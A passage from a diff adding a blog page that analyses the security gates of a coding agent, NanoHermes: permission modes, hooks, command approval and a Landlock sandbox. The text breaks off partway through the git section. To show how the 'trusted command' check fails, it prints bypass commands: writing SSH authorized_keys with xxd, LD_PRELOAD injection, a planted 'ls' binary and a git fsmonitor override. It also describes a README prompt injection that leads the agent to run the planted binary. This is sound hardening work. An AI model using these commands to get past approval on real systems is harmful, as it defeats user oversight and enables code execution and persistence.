@@ -1,0 +1,913 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
+    <!-- Text must stay zoomable (WCAG 1.4.4) — no scale limits here.
+         Rationale for the whole zoom story lives in global.scss. -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="description" content="Five gates, layered so each one can fail alone: tool list, permission mode, hooks, approval and a Landlock sandbox. The surprising part is where the hole is, and it is not inside the sandbox." />
+    <!-- Google AdSense 站点验证 -->
+    <meta name="google-adsense-account" content="ca-pub-7173042291490259" />
+    <!-- Google AdSense 自动广告（非 AMP）。此模板会被预渲染复制到每个静态页面，
+         因此全站只需在这里放一次；广告位由 Google 自动挑选，页面里无需再插入容器。 -->
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-7173042291490259"
+            crossorigin="anonymous"></script>
+    <!-- Google Search Console 站点验证 -->
+    <meta name="google-site-verification" content="1Cv5EI2xZqXCaZnwCBQJBHukLAD6SJkn1gfuamc7fpU" />
+    <link rel="canonical" href="https://blog.zhoujun.dev/en/article/agent-security-run-commands-safely/" />
+    <meta property="og:title" content="Agent security: letting it run commands without losing control | Stack Frame" />
+    <meta property="og:description" content="Five gates, layered so each one can fail alone: tool list, permission mode, hooks, approval and a Landlock sandbox. The surprising part is where the hole is, and it is not inside the sandbox." />
+    <meta property="og:type" content="website" />
+    <meta property="og:url" content="https://blog.zhoujun.dev/en/article/agent-security-run-commands-safely/" />
+    <meta property="og:site_name" content="尘世栈帧" />
+    <meta property="og:locale" content="en_US" />
+    <meta property="og:image" content="https://blog.zhoujun.dev/og-image.jpg" />
+    <meta property="og:image:secure_url" content="https://blog.zhoujun.dev/og-image.jpg" />
+    <meta property="og:image:type" content="image/jpeg" />
+    <meta property="og:image:width" content="1200" />
+    <meta property="og:image:height" content="630" />
+    <meta property="og:image:alt" content="尘世栈帧首页 — 技术笔记与原创项目" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="Agent security: letting it run commands without losing control | Stack Frame" />
+    <meta name="twitter:description" content="Five gates, layered so each one can fail alone: tool list, permission mode, hooks, approval and a Landlock sandbox. The surprising part is where the hole is, and it is not inside the sandbox." />
+    <meta name="twitter:image" content="https://blog.zhoujun.dev/og-image.jpg" />
+    <link rel="alternate" type="application/rss+xml" title="尘世栈帧 RSS" href="https://blog.zhoujun.dev/rss.xml" />
+    <link rel="manifest" href="/manifest.json" />
+    <link rel="apple-touch-icon" href="/icons/apple-touch-icon.png" />
+    <meta name="theme-color" content="#f7f7f2" media="(prefers-color-scheme: light)" />
+    <meta name="theme-color" content="#18201c" media="(prefers-color-scheme: dark)" />
+    <meta name="author" content="Stack Frame" />
+    <title>Agent security: letting it run commands without losing control | Stack Frame</title>
+    <!-- 站点级结构化数据：作为文章 Article 的 isPartOf / publisher 锚点。 -->
+    <script type="application/ld+json">
+      {
+        "@context": "https://schema.org",
+        "@graph": [
+          {
+            "@type": "WebSite",
+            "@id": "https://blog.zhoujun.dev/#website",
+            "url": "https://blog.zhoujun.dev/",
+            "name": "尘世栈帧",
+            "description": "尘世栈帧 — 技术、编程、AI 与科学，以及 Happy Games、Halo Music 等在浏览器里就能用的原创项目。",
+            "inLanguage": "zh-CN",
+            "publisher": { "@id": "https://blog.zhoujun.dev/#publisher" }
+          },
+          {
+            "@type": "Person",
+            "@id": "https://blog.zhoujun.dev/#person",
+            "name": "Stack Frame",
+            "url": "https://blog.zhoujun.dev/about/",
+            "sameAs": ["https://github.com/zhoujungis"]
+          },
+          {
+            "@type": "Organization",
+            "@id": "https://blog.zhoujun.dev/#publisher",
+            "name": "尘世栈帧",
+            "url": "https://blog.zhoujun.dev/",
+            "logo": {
+              "@type": "ImageObject",
+              "url": "https://blog.zhoujun.dev/icons/icon-512.png",
+              "width": 512,
+              "height": 512
+            }
+          }
+        ]
+      }
+    </script>
+    <!-- Google Analytics — set VITE_GA_ID env var to enable. Until then, no GA scripts. -->
+    <script>
+      (function(){var r=sessionStorage.getItem('redirect');if(r){sessionStorage.removeItem('redirect');history.replaceState(null,null,r);}})();
+    </script>
+    <!-- KaTeX + Mermaid are injected on demand by MarkdownView.vue only when
+         the current article actually contains math ($...$) or ```mermaid
+         blocks. Pinned versions + SRI hashes are kept there (see loadMath/
+         loadMermaid) to defend against CDN supply-chain compromise. -->
+
+    <!-- Cross-origin hints: API is called on first paint, covers come from
+         Unsplash, KaTeX/Mermaid load from jsdelivr on demand. -->
+    <link rel="preconnect" href="https://zhoujun123.pythonanywhere.com" crossorigin />
+    <link rel="dns-prefetch" href="https://images.unsplash.com" />
+    <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" />
+
+    <!-- Service Worker — register only; updates propagate via sw.js byte
+         differences (skipWaiting + clients.claim in sw.js). Unregistering on
+         every load forced a full SW reinstall + shell refetch each visit. -->
+    <script>
+      if ('serviceWorker' in navigator) {
+        navigator.serviceWorker.register('/sw.js');
+      }
+    </script>
+    <script type="module" crossorigin src="/assets/index-zJEmckAu.js"></script>
+    <link rel="modulepreload" crossorigin href="/assets/_plugin-vue_export-helper-tRUQJj3d.js">
+    <link rel="modulepreload" crossorigin href="/assets/rolldown-runtime-QTnfLwEv.js">
+    <link rel="modulepreload" crossorigin href="/assets/client-DDSzq_-U.js">
+    <link rel="stylesheet" crossorigin href="/assets/index.CXpDnQUw.css">
+  
+<style>
+.ns-article{max-width:780px;margin:96px auto 64px;padding:0 20px;line-height:1.85;color:var(--text-primary,#1f2a24);font-family:'PingFang SC','Hiragino Sans GB','Noto Sans SC','Microsoft YaHei','Segoe UI',sans-serif}
+.ns-article .ns-breadcrumb{font-size:.8rem;line-height:1.6;margin-bottom:.8em;color:#657168}
+.ns-article .ns-breadcrumb a{color:#3f6b57;text-decoration:none}
+.ns-article h1{font-size:1.8rem;line-height:1.4;margin:0 0 .6em}
+.ns-article h2{font-size:1.4rem;margin:1.6em 0 .6em}
+.ns-article h3{font-size:1.2rem;margin:1.4em 0 .5em}
+.ns-article p{margin:.8em 0}
+.ns-article img{max-width:100%;height:auto;border-radius:8px}
+.ns-article pre{background:#faf5f7;border-left:3px solid #3f6b57;border-radius:8px;padding:14px 16px;overflow-x:auto;font-size:.85em}
+.ns-article code{font-family:SFMono-Regular,'Cascadia Code',Consolas,monospace;font-size:.9em}
+.ns-article table{border-collapse:collapse;margin:1em 0}
+.ns-article .table-scroll{overflow-x:auto;-webkit-overflow-scrolling:touch}
+.ns-article th,.ns-article td{border:1px solid #dce2da;padding:8px 12px}
+.ns-article a{color:#3f6b57}
+.ns-article .ns-meta{color:#657168;font-size:.85rem;margin-bottom:1.5em}
+.ns-article .ns-taxonomy{font-size:.82rem;line-height:1.9;color:#657168;margin:1.2em 0}
+.ns-article .ns-taxonomy a{color:#3f6b57;text-decoration:none;margin-right:.6em}
+.ns-article .ns-series{margin:1.4em 0;padding:14px 16px;background:#f2f4ee;border-radius:8px;font-size:.9rem}
+.ns-article .ns-series ol{margin:.6em 0;padding-left:1.4em}
+.ns-article .ns-topic{margin:2em 0;padding:16px;border:1px solid #dce2da;border-radius:8px}
+.ns-article .ns-topic a{color:#3f6b57}
+.ns-article .ns-pager,.ns-article .ns-related{margin-top:2em;padding-top:1em;border-top:1px solid #dce2da;font-size:.9rem}
+.ns-article .ns-pager a,.ns-article .ns-related a{color:#3f6b57;text-decoration:none}
+.ns-article .ns-pager li,.ns-article .ns-related li{margin:.4em 0}
+.ns-article .ns-site-nav{margin-top:2em;padding-top:1em;border-top:1px solid #dce2da;font-size:.88rem;line-height:2}
+.ns-article .ns-site-nav a{color:#3f6b57;text-decoration:none;margin-right:.9em}
+.ns-home-list{max-width:780px;margin:96px auto 64px;padding:0 20px;line-height:1.8;font-family:'PingFang SC','Hiragino Sans GB','Noto Sans SC','Microsoft YaHei','Segoe UI',sans-serif}
+.ns-home-list h1{font-size:1.6rem;margin:0 0 .5em}
+.ns-home-list h2{font-size:1.12rem;margin:2em 0 .5em;padding-bottom:.35em;border-bottom:1px solid #dce2da}
+.ns-home-list ul{padding-left:1.2em}
+.ns-home-list li{margin:.4em 0}
+.ns-home-list a{color:#3f6b57}
+.ns-home-list .ns-sub{color:#3f6b57;font-size:.95rem;font-weight:700;letter-spacing:.18em;margin:.3em 0 .9em}
+.ns-home-list .ns-lede{font-size:1rem;font-weight:700;margin:.6em 0}
+.ns-home-list .ns-meta,.ns-home-list .ns-date{color:#657168;font-size:.82rem}
+.ns-home-list .ns-excerpt{color:#657168;font-size:.85rem;line-height:1.7;margin:.25em 0 1em}
+.ns-home-list .ns-more{color:#657168;font-size:.88rem}
+.ns-home-list .ns-nav{margin-top:2.5em;padding-top:1em;border-top:1px solid #dce2da;font-size:.88rem;line-height:2}
+.ns-home-list .ns-nav a{margin-right:.9em}
+.ns-list{max-width:780px;margin:96px auto 64px;padding:0 20px;line-height:1.8;font-family:'PingFang SC','Hiragino Sans GB','Noto Sans SC','Microsoft YaHei','Segoe UI',sans-serif}
+.ns-list h1{font-size:1.8rem;margin:0 0 .4em}
+.ns-list h2{font-size:1.15rem;margin:1.6em 0 .4em;padding-bottom:.3em;border-bottom:1px solid #dce2da}
+.ns-list h3{font-size:1rem;margin:1.2em 0 .3em;color:#657168}
+.ns-list .ns-lead{color:#657168;font-size:.9rem;margin:0 0 1.5em}
+.ns-list ul{padding-left:1.2em;margin:.3em 0}
+.ns-list li{margin:.35em 0}
+.ns-list a{color:#3f6b57}
+.ns-list .ns-date{color:#657168;font-size:.82rem}
+.ns-list .ns-nav{margin-top:2.5em;padding-top:1em;border-top:1px solid #dce2da;font-size:.9rem}
+.ns-list .ns-nav a{margin-right:.8em}
+</style>
+    <link rel="alternate" hreflang="zh-CN" href="https://blog.zhoujun.dev/article/agent-security-run-commands-safely/" />
+    <link rel="alternate" hreflang="en" href="https://blog.zhoujun.dev/en/article/agent-security-run-commands-safely/" />
+    <link rel="alternate" hreflang="x-default" href="https://blog.zhoujun.dev/article/agent-security-run-commands-safely/" />
+  </head>
+  <body>
+    <div id="app"><div class="ns-article"><h1>Agent security: letting it run commands without losing control</h1><div class="ns-meta">2026-10-28 · 36 min · Stack Frame</div><div class="markdown-body">
+<blockquote>
+<p>Who this is for: people about to point a coding agent at a real repository on a real machine; people who have been startled by "it deleted my files"; people who want to know which of the four layers, permission mode, approval, hooks and a kernel sandbox, is actually stopping what.</p>
+<p><strong>TL;DR:</strong> security here is not a switch but five independent gates: the tool list, the permission mode, PreToolUse hooks, command approval and a Landlock sandbox. Each narrows the next, and none depends on another to catch it. Measured against real cases, the weakest link is not the sandbox. It is that <strong>the sandbox covers child processes only, never the built-in file tools</strong>.</p>
+<p>Reading time around 36 minutes. Level: advanced.</p>
+</blockquote>
+
+<strong>Contents</strong>
+<ul>
+<li>Security is five gates, not a switch</li>
+<li>The five gates and how each one fails</li>
+<li>Permission modes: what each actually blocks</li>
+<li>What the default configuration really does</li>
+<li>The first gate: three layers in <code>check_tool</code></li>
+<li>Allow and deny lists: order decides meaning</li>
+<li>PreToolUse hooks: a tool chain with a veto</li>
+<li>The edges of a hook: 30 seconds, no sandbox, trusted config</li>
+<li>Approval policy: three values and one short circuit</li>
+<li>Six tests inside <code>is_trusted_command</code></li>
+<li>Four holes in the read-only list</li>
+<li>Matching by basename: <code>/tmp/ls</code> counts as trusted</li>
+<li>Environment prefixes: the LD_PRELOAD line</li>
+<li>Why a git subcommand list cannot stop aliases</li>
+<li>Metacharacter blocking: those nine characters are necessary</li>
+<li>Landlock: a kernel sandbox with no crates</li>
+<li>What <code>pre_exec</code> may and may not do</li>
+<li>ABI versions and why permission bits are trimmed</li>
+<li>A read-only root and a writable workspace</li>
+<li>The network is not restricted</li>
+<li>Fail closed, and why it will not degrade</li>
+<li>The sandbox covers child processes only</li>
+<li><code>resolve</code> does no normalization</li>
+<li>Symlinks: the kernel and the built-in tools disagree</li>
+<li>Four escape surfaces</li>
+<li>The mode and sandbox matrix</li>
+<li>Why plan mode is not a read-only sandbox</li>
+<li>Goal mode has nobody to ask</li>
+<li>Seven attack scenarios</li>
+<li>Seven places to harden</li>
+<li>How to test a security boundary</li>
+</ul>
+
+<h2>Security is five gates, not a switch</h2>
+
+<p>The usual approach is a <code>--safe</code> flag. That always fails, because the problem is not one-dimensional:</p>
+
+<ul>
+<li>The model wants to call a tool that should not exist.</li>
+<li>It calls a legitimate tool with a path outside the workspace.</li>
+<li>Its command looks read-only but writes files.</li>
+<li>It genuinely needs to run something dangerous, but not without a human agreeing.</li>
+<li>The command is legal, and the child process it spawns does something else.</li>
+</ul>
+
+<p>Five situations, five interception points. So the right definition of security is a <strong>sequence of gates, one per dimension, none of which relies on another to catch it</strong>. NanoHermes has five: the tool list, the permission mode, PreToolUse hooks, command approval and a Landlock sandbox. They span the whole stack from JSON generation to kernel syscalls, which is the point: when one is bypassed, the next still stands.</p>
+
+<h2>The five gates and how each one fails</h2>
+
+<table>
+<thead><tr><th>#</th><th>Gate</th><th>Where</th><th>Blocks</th><th>If it fails</th></tr></thead>
+<tbody>
+<tr><td>1</td><td>Tool list filtering</td><td><code>build_tools</code></td><td>The model never sees a banned tool</td><td>The model tries anyway and gate 2 stops it</td></tr>
+<tr><td>2</td><td><code>check_tool</code></td><td>First line of <code>execute</code></td><td>Mode bans, deny list, allow list</td><td>Any tool can run</td></tr>
+<tr><td>3</td><td>PreToolUse hook</td><td>Middle of <code>execute</code></td><td>A user script's non-zero exit</td><td>User policy is inert</td></tr>
+<tr><td>4</td><td>Command approval</td><td><code>run_command</code>, <code>git_commit</code></td><td>Non-read-only commands</td><td>Dangerous commands run unconfirmed</td></tr>
+<tr><td>5</td><td>Landlock</td><td><code>pre_exec</code> in the child</td><td>Writes outside the sandbox</td><td>A child can write anywhere</td></tr>
+</tbody>
+</table>
+
+<p>The coverage is nested, not parallel. Gate one is advertising and does no blocking. Gates two and three are per tool call. Gate four is per command. Gate five is per spawned process.</p>
+
+<p>Which produces the single most important conclusion in this post: <strong>the built-in file tools, <code>read_file</code>, <code>write_file</code>, <code>edit_file</code> and <code>apply_patch</code>, are governed by gates two and three only</strong>. Approval and the kernel sandbox cannot stop the agent from writing to <code>/etc/</code> with <code>write_file</code>, because no child process is ever spawned.</p>
+
+<h2>Permission modes: what each actually blocks</h2>
+
+<table>
+<thead><tr><th>Mode</th><th>Intent</th><th>Blocked tools</th><th>auto_approve</th><th>Policy</th></tr></thead>
+<tbody>
+<tr><td><code>default</code></td><td>Normal work</td><td>None</td><td>From config</td><td>From config</td></tr>
+<tr><td><code>accept-edits</code></td><td>File edits unasked, commands still asked</td><td>None</td><td>Forced false</td><td>From config</td></tr>
+<tr><td><code>plan</code></td><td>Read-only analysis</td><td>Writes, patches, commands, commit</td><td>From config</td><td>From config</td></tr>
+<tr><td><code>goal</code></td><td>Unattended until done</td><td>None</td><td>Forced true</td><td>Forced never</td></tr>
+<tr><td><code>debug</code></td><td>Reproduce without breaking</td><td>Writes, patches, commit</td><td>From config</td><td>From config</td></tr>
+</tbody>
+</table>
+
+<p><strong><code>accept-edits</code> is the counterintuitive one.</strong> The name suggests loosening, and the implementation forces <code>auto_approve</code> to false, because in this mode only file edits skip the prompt, and "commands are still asked" has to be guaranteed explicitly. Inheriting <code>auto_approve: true</code> would turn the mode into "ask nothing".</p>
+
+<pre><code>/// AcceptEdits always keeps shell confirmation on; Goal has nobody to
+/// ask, so it never blocks; the rest inherit the configured flag.
+pub fn auto_approve(self, configured: bool) -&gt; bool {
+    match self {
+        PermissionMode::AcceptEdits =&gt; false,
+        PermissionMode::Goal =&gt; true,
+        PermissionMode::Default | PermissionMode::Plan | PermissionMode::Debug =&gt; configured,
+    }
+}
+</code></pre>
+
+<p><strong><code>goal</code> is the only mode that gives up human supervision on purpose.</strong> It forces approval on and policy to never, on the stated grounds that there is nobody around to ask. That is honest: better to declare no asking than to pretend and always time out.</p>
+
+<p><strong><code>plan</code> and <code>debug</code> differ on <code>run_command</code>.</strong> Plan blocks it, debug allows it, because plan means reading and thinking while debug means reproducing. Both block file writes, so their danger is orthogonal rather than ordered: debug allows arbitrary code execution, plan does not.</p>
+
+<h2>What the default configuration really does</h2>
+
+<pre><code>auto_approve: true,
+approval_policy: ApprovalPolicy::Untrusted,
+sandbox: SandboxMode::Off,
+permission_mode: PermissionMode::Default,
+</code></pre>
+
+<p><code>auto_approve</code> defaults to true, and <code>needs_approval</code> starts with a short circuit that returns false when it is set. So the default <code>untrusted</code> policy, which would ask about every command, never runs. <code>sandbox: Off</code> means Landlock is never attached.</p>
+
+<p>Run the binary with no flags and the real posture is: every tool available, no command questioned, no filesystem restriction. The help text, meanwhile, says the policy behaves as "untrusted with -y", which reads as if -y makes it untrusted, when -y sets the policy to never and approval to true. The opposite of what it says.</p>
+
+<p>That is not a cosmetic documentation issue. A user reading the help concludes the default is to ask; the default does not ask. A wrong default in security configuration is far more dangerous than a missing feature, because it makes people <strong>believe they are protected</strong>.</p>
+
+<p>Two fixes, neither complex: default to <code>auto_approve: false</code> with <code>on-request</code>, letting -y loosen it; or keep the behavior and print the posture in a startup banner, every time, not only under a status flag.</p>
+
+<h2>The first gate: three layers in check_tool</h2>
+
+<pre><code>pub fn check_tool(&amp;self, name: &amp;str) -&gt; Result&lt;(), String&gt; {
+    // 1. hard block from the mode
+    if self.permission_mode.blocked_tools().contains(&amp;name) {
+        return Err(format!(
+            "tool `{name}` is not available in {:?} mode",
+            self.permission_mode
+        ));
+    }
+    // 2. the deny list always wins
+    if self.disallowed_tools.iter().any(|t| t == name) {
+        return Err(format!("tool `{name}` is disallowed by configuration"));
+    }
+    // 3. the allow list only applies when non-empty
+    if !self.allowed_tools.is_empty() &amp;&amp; !self.allowed_tools.iter().any(|t| t == name) {
+        return Err(format!("tool `{name}` is not in the allowed list"));
+    }
+    Ok(())
+}
+</code></pre>
+
+<p>The mode comes first because it expresses this turn's intent, and intent outranks preference. In plan mode, adding <code>write_file</code> to the allow list does nothing.</p>
+
+<p>The deny list beats the allow list, matching security convention: an explicit prohibition usually exists because something already went wrong.</p>
+
+<p>An empty allow list means <strong>everything is allowed</strong>, not nothing. That is a semantic trap: to restrict to reading you must list all four reading tools, and forgetting one looks like a broken tool rather than a hole. It fails closed in the sense that the surface shrinks, but it does not fail intuitive.</p>
+
+<p>The return value has two destinations: <code>build_tools</code> uses it to hide tools entirely, and <code>execute</code> uses it to return an error string. Both are needed, because a model may recall a tool name from history or hallucinate one.</p>
+
+<h2>Allow and deny lists: order decides meaning</h2>
+
+<table>
+<thead><tr><th>Mode block</th><th>Deny</th><th>Allow</th><th>Result</th><th>Why</th></tr></thead>
+<tbody>
+<tr><td>Hit</td><td>Any</td><td>Any</td><td>Rejected</td><td>The mode wins</td></tr>
+<tr><td>Miss</td><td>Hit</td><td>Any</td><td>Rejected</td><td>Deny beats allow</td></tr>
+<tr><td>Miss</td><td>Miss</td><td>Empty</td><td>Allowed</td><td>Empty means unrestricted</td></tr>
+<tr><td>Miss</td><td>Miss</td><td>Hit</td><td>Allowed</td><td>The list permits it</td></tr>
+<tr><td>Miss</td><td>Miss</td><td>Miss</td><td>Rejected</td><td>Non-empty means exclusive</td></tr>
+</tbody>
+</table>
+
+<p>A subtler problem: the lists match tool names, not capabilities. Denying <code>run_command</code> does not stop <code>git_commit</code> from running git, and does not stop <code>subagent</code> from starting something that writes files. Banning a name bans an entrance, not a capability.</p>
+
+<h2>PreToolUse hooks: a tool chain with a veto</h2>
+
+<pre><code>for hook in self
+    .cfg
+    .hooks
+    .iter()
+    .filter(|h| h.event == HookEvent::PreToolUse &amp;&amp; h.matches(&amp;call.name))
+{
+    match hooks::run(hook, &amp;call.name, &amp;args, &amp;self.cfg.workspace) {
+        Ok(o) if o.ok() =&gt; {}
+        Ok(o) =&gt; {
+            return format!(
+                "ERROR: `{}` blocked by PreToolUse hook (exit {}):
+{}",
+                call.name, o.code, o.output
+            )
+        }
+        Err(e) =&gt; return format!("ERROR: PreToolUse hook failed: {e}"),
+    }
+}
+</code></pre>
+
+<p>Any non-zero exit is a refusal, whether it means "denied" or "the script crashed". That is fail closed, and it is right: a crashing hook is not an opinion.</p>
+
+<p>Hook output goes back to the model verbatim, so a hook can also explain policy, like "do not edit files under src/generated". It is an interceptor and a channel at once.</p>
+
+<p>PostToolUse has no veto, only an appended note, because refusing after the fact would leave history claiming a blocked operation that already happened.</p>
+
+<p><code>h.matches</code> supports wildcards, so a hook can cover every <code>write_*</code> tool without listing names.</p>
+
+<h2>The edges of a hook: 30 seconds, no sandbox, trusted config</h2>
+
+<p><strong>A hard 30 second timeout</strong>, after which the child is killed and the exit code recorded as -2, which counts as non-zero and therefore as a refusal. A stuck hook cannot hang the agent forever, and cannot be read as approval.</p>
+
+<p>One implementation detail: the timeout branch kills only the direct child. If the hook spawned its own background service, the drain threads wait for pipe EOF, which means they wait for the grandchild. "30 seconds" is not true for that pattern.</p>
+
+<p><strong>Hooks run unsandboxed.</strong> <code>hooks::run</code> sets a working directory, two environment variables and three pipes, and never calls <code>sandbox::attach</code>. That is defensible, since hooks come from user configuration, but it means <code>sandbox: read-only</code> does nothing for them. A hook script that clones a repository writes outside the workspace.</p>
+
+<p><strong>The failure path leaks threads.</strong> When <code>try_wait</code> errors the function returns immediately, and the two spawned drain threads are neither joined nor dropped, so they keep running to EOF. Rare, since <code>try_wait</code> only fails when the underlying call does, but in a long-lived daemon a leaked thread per failure adds up.</p>
+
+<h2>Approval policy: three values and one short circuit</h2>
+
+<pre><code>pub fn needs_approval(auto_approve: bool, policy: ApprovalPolicy, command: &amp;str) -&gt; bool {
+    if auto_approve {
+        return false;
+    }
+    match policy {
+        ApprovalPolicy::Never =&gt; false,
+        ApprovalPolicy::Untrusted =&gt; true,
+        ApprovalPolicy::OnRequest =&gt; !is_trusted_command(command),
+    }
+}
+</code></pre>
+
+<table>
+<thead><tr><th>Policy</th><th>Asks</th><th>Typical use</th></tr></thead>
+<tbody>
+<tr><td>never</td><td>Never</td><td>Full trust or unattended</td></tr>
+<tr><td>on-request</td><td>Only non-read-only commands</td><td>Everyday work</td></tr>
+<tr><td>untrusted</td><td>Everything, including <code>ls</code></td><td>First contact with an unfamiliar repository</td></tr>
+</tbody>
+</table>
+
+<p>The <code>auto_approve</code> short circuit overrides every policy, which is how a mode can force trust.</p>
+
+<p><code>untrusted</code> asking about <code>ls</code> sounds safe and produces approval fatigue. After forty prompts a user presses y without reading, and the one dangerous command rides along. Alert fatigue is the classic failure of security design, and this policy is its textbook case.</p>
+
+<p><code>on-request</code> is the better default, and its quality rests entirely on how accurate <code>is_trusted_command</code> is.</p>
+
+<h2>Six tests inside is_trusted_command</h2>
+
+<pre><code>pub fn is_trusted_command(command: &amp;str) -&gt; bool {
+    let cmd = command.trim();
+    if cmd.is_empty() {
+        return false;
+    }
+    // 1. any control operator, redirection or substitution is untrusted
+    if cmd.chars().any(|c| {
+        matches!(
+            c,
+            '|' | '&amp;' | ';' | '&lt;' | '&gt;' | '`' | '$' | '(' | ')'
+        )
+    }) {
+        return false;
+    }
+    // 2. skip leading KEY=VALUE assignments
+    let program = loop {
+        match tokens.next() {
+            Some(t) if is_env_assignment(t) =&gt; continue,
+            Some(t) =&gt; break t,
+            None =&gt; return false,
+        }
+    };
+    // 3. judge by basename
+    let program = program.rsplit('/').next().unwrap_or(program);
+    // 4. git goes through a subcommand list, everything else by binary name
+    if program == "git" {
+        return git_subcommand_is_read_only(&amp;mut tokens);
+    }
+    TRUSTED_BINARIES.contains(&amp;program)
+}
+</code></pre>
+
+<p>The first two tests are sound. The operator list covers pipes, background and logical-and, command separators, both redirections, backticks, dollar signs, subshells and newlines. The last one blocks "harmless first line, <code>rm -rf /</code> second line".</p>
+
+<p>Crucially, the check runs on the whole command string before tokenizing, so those characters are caught wherever they appear, including inside quotes. That is far more reliable than inspecting tokens, because quoting and escaping make token boundaries differ from what the shell actually does.</p>
+
+<p>The last four tests each have a problem.</p>
+
+<h2>Four holes in the read-only list</h2>
+
+<p><code>TRUSTED_BINARIES</code> holds 62 entries with a promise in the comment: purely read-only, never writing, never spawning other programs. At least four break it.</p>
+
+<table>
+<thead><tr><th>Command</th><th>How it writes</th><th>Why it slipped in</th></tr></thead>
+<tbody>
+<tr><td><code>sort</code></td><td><code>sort -o out.txt in.txt</code></td><td><code>-o</code> writes the result to a file</td></tr>
+<tr><td><code>tree</code></td><td><code>tree -o out.txt</code></td><td>Same option, same effect</td></tr>
+<tr><td><code>xxd</code></td><td><code>xxd -r in.hex out.bin</code></td><td><code>-r</code> reverses hex back into binary and writes it</td></tr>
+<tr><td><code>date</code></td><td><code>date -s 2026-01-01</code></td><td><code>-s</code> sets the system clock</td></tr>
+</tbody>
+</table>
+
+<p><code>sort -o</code> and <code>tree -o</code> need no special privilege. And <code>xxd -r</code> can write arbitrary binary content, which means one "read-only" entry provides a complete file write primitive:</p>
+
+<pre><code>xxd -r payload.hex /home/user/.ssh/authorized_keys
+</code></pre>
+
+<p>No control operators, program name in the list, ordinary file arguments. Trusted, no approval needed. And <code>date -s</code> is subtler: it breaks certificate validation, log ordering and build caches that depend on time.</p>
+
+<p>The fix is not deleting four entries, which would also remove their legitimate uses. It is upgrading from "trust the program" to "trust the invocation".</p>
+
+<pre><code>fn is_read_only_invocation(program: &amp;str, args: &amp;[&amp;str]) -&gt; bool {
+    match program {
+        "sort" | "tree" =&gt; !args.iter().any(|a| a == "-o" || a.starts_with("-o")),
+        "xxd" =&gt; !args.iter().any(|a| a == "-r"),
+        "date" =&gt; !args.iter().any(|a| a == "-s" || a.starts_with("--set")),
+        _ =&gt; TRUSTED_BINARIES.contains(&amp;program),
+    }
+}
+</code></pre>
+
+<p>Small change, better semantics: <code>sort</code> is not read-only, but <code>sort</code> without <code>-o</code> is.</p>
+
+<h2>Matching by basename: /tmp/ls counts as trusted</h2>
+
+<p>Taking the basename is meant to make <code>/bin/ls</code> and <code>ls</code> the same program. It also makes <code>/tmp/evil/ls</code> the trusted <code>ls</code>, regardless of who wrote it or what it contains.</p>
+
+<pre><code>/tmp/x/ls -la
+</code></pre>
+
+<p>No operators, basename is <code>ls</code>, in the list, trusted, runs without asking, and <code>/tmp/x/ls</code> can be any script at all.</p>
+
+<p>How bad this is depends on the threat model. If the model is benevolent and merely fallible, it never runs <code>/tmp/x/ls</code>. If the repository might contain a hostile file the model could read and follow, this is a complete code execution path: drop an executable named <code>ls</code> in the repository and let the README talk the model into running it.</p>
+
+<p>The weak fix refuses any command containing a path separator, which costs the convenience of <code>/bin/ls</code> but only adds a prompt. The strong fix validates that the path is under a trusted root such as <code>/bin</code> or <code>/usr/bin</code>, which requires handling PATH lookup, symlinks and the fact that Windows has no <code>/bin</code>. For a cross-platform tool the first is realistic, the second suits a strict Linux mode.</p>
+
+<h2>Environment prefixes: the LD_PRELOAD line</h2>
+
+<pre><code>LD_PRELOAD=/tmp/evil.so ls
+</code></pre>
+
+<p>The program is <code>ls</code>, in the list, no dangerous arguments, judged read-only and trusted. <code>LD_PRELOAD</code> makes the dynamic loader pull in <code>/tmp/evil.so</code> before <code>ls</code> starts, which is arbitrary code running with your full privileges.</p>
+
+<table>
+<thead><tr><th>Variable</th><th>Effect</th><th>Risk</th></tr></thead>
+<tbody>
+<tr><td><code>LD_PRELOAD</code></td><td>Preload a shared library</td><td>Arbitrary code execution</td></tr>
+<tr><td><code>LD_LIBRARY_PATH</code></td><td>Change the library search path</td><td>Hijack a dependency</td></tr>
+<tr><td><code>GIT_SSH_COMMAND</code></td><td>Set the ssh command git uses</td><td>Runs an arbitrary program</td></tr>
+<tr><td><code>PAGER</code>, <code>GIT_PAGER</code></td><td>Set the pager</td><td><code>git log</code> spawns it</td></tr>
+<tr><td><code>BASH_ENV</code></td><td>A file read by non-interactive bash</td><td>Arbitrary code execution</td></tr>
+<tr><td><code>NODE_OPTIONS</code></td><td>Node startup flags</td><td><code>--require /tmp/x.js</code></td></tr>
+</tbody>
+</table>
+
+<p><code>PAGER</code> is the sharpest example: <code>git log</code> is on the trusted subcommand list, so it runs without a prompt, unless the environment points <code>PAGER</code> at a script, in which case <code>git log</code> spawns it. "git log is read-only" depends on the environment being clean, and the environment is exactly what the model can set.</p>
+
+<p>The fix is to allow only known-safe variable prefixes, or to forbid them entirely. Refusing every prefix costs an approval for <code>FOO=bar ./test</code>, which in an agent context is fine.</p>
+
+<h2>Why a git subcommand list cannot stop aliases</h2>
+
+<pre><code>fn git_subcommand_is_read_only&lt;'a&gt;(tokens: &amp;mut impl Iterator&lt;Item = &amp;'a str&gt;) -&gt; bool {
+    const VALUE_FLAGS: &amp;[&amp;str] = &amp;["-C", "-c", "--git-dir", "--work-tree", "--namespace"];
+    let mut pending_value = false;
+    for token in tokens {
+        if pending_value {
+            pending_value = false;
+            continue;
+        }
+        if token.starts_with('-') {
+            if VALUE_FLAGS.contains(&amp;token) {
+                pending_value = true;
+            }
+            continue;
+        }
+        return TRUSTED_GIT_SUBCOMMANDS.contains(&amp;token);
+    }
+    false
+}
+</code></pre>
+
+<p><code>VALUE_FLAGS</code> exists so that <code>git -C /repo status</code> does not treat <code>/repo</code> as the subcommand. Correct, and tested. Three holes remain.</p>
+
+<p><strong>One: <code>git -c</code> can name any program.</strong> <code>git -c core.fsmonitor=/tmp/evil.sh status</code> skips the value and sees <code>status</code>. But <code>core.fsmonitor</code> is executed by git on every status check. Same for <code>core.editor</code>, <code>core.pager</code>, <code>diff.external</code> and <code>filter.*.clean</code>.</p>
+
